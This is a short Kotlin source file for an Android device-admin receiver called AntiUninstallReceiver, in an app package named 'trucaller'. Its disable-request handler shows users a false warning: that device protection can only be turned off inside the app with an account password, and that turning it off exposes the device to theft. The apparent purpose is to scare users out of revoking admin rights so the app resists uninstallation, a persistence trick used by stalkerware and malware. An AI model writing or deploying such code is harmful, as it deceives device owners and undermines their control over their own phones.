package com.example.trucaller.service

import android.app.admin.DeviceAdminReceiver
import android.content.Context
import android.content.Intent
import android.widget.Toast

class AntiUninstallReceiver : DeviceAdminReceiver() {
    override fun onEnabled(context: Context, intent: Intent) {
        Toast.makeText(context, "TruCaller device protection enabled", Toast.LENGTH_SHORT).show()
    }

    override fun onDisabled(context: Context, intent: Intent) {
        Toast.makeText(context, "TruCaller device protection disabled", Toast.LENGTH_SHORT).show()
    }

    override fun onDisableRequested(context: Context, intent: Intent): CharSequence {
        return "WARNING: Device protection can only be disabled from within TruCaller app " +
                "using your account password. Disabling from here is not recommended and " +
                "will leave your device unprotected against theft. " +
                "Please open TruCaller → Profile → Device Protection to manage this setting securely."
    }
}
